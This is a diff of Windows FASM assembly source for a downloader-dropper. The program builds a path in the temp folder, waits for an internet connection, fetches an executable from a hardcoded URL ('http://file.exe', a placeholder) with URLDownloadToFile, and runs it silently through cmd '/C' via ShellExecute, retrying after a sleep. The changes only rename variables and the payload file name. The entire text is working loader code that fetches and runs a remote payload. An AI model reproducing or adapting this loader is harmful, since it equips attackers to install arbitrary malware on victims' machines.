@@ -26,14 +26,14 @@ include 'win32a.inc'
 
 section '.data' data readable writable
 
-        folderPathTempBuffer rb 256
-        pathFileDownloadBuffer rb 256
-        consoleParametersRunFileBuffer rb 256
+        tmpDir rb 256
+        fileDir rb 256
+        param rb 256
 
         sleepSeconds dd 5
 
         url db 'http://file.exe',0
-        fileName db 'payload.exe',0
+        fileName db 'file.exe',0
 
         s1 db '/C ',0
         s2 db 'open',0
@@ -42,27 +42,29 @@ section '.data' data readable writable
 section '.code' code readable executable
 
         start:
-                invoke GetTempPath,folderPathTempBuffer,folderPathTempBuffer
-                invoke strcpy_s,pathFileDownloadBuffer,pathFileDownloadBuffer,folderPathTempBuffer
-                invoke strcat_s,pathFileDownloadBuffer,pathFileDownloadBuffer,fileName
-                invoke strcpy_s,consoleParametersRunFileBuffer,consoleParametersRunFileBuffer,s1
-                invoke strcat_s,consoleParametersRunFileBuffer,consoleParametersRunFileBuffer,pathFileDownloadBuffer
+                invoke GetTempPath,tmpDir,tmpDir
+
+                invoke strcpy_s,fileDir,fileDir,tmpDir
+                invoke strcat_s,fileDir,fileDir,fileName
+
+                invoke strcpy_s,param,param,s1
+                invoke strcat_s,param,param,fileDir
 restart:
-                invoke PathFileExists,pathFileDownloadBuffer
+                invoke PathFileExists,fileDir
                 cmp eax,0
                 jz download ; false
-                jne run ; true
+                jne run     ; true
 download:
                 invoke InternetGetConnectedState,0,0
                 cmp eax,0
                 jz sleep ; false
 
-                invoke URLDownloadToFile,0,url,pathFileDownloadBuffer,0,0
+                invoke URLDownloadToFile,0,url,fileDir,0,0
                 cmp eax,0
                 jne sleep ; false
                 jz run    ; true
 run:
-                invoke ShellExecute,0,s2,s3,consoleParametersRunFileBuffer,0,0
+                invoke ShellExecute,0,s2,s3,param,0,0
                 jmp exit
 sleep:
                 mov eax,sleepSeconds
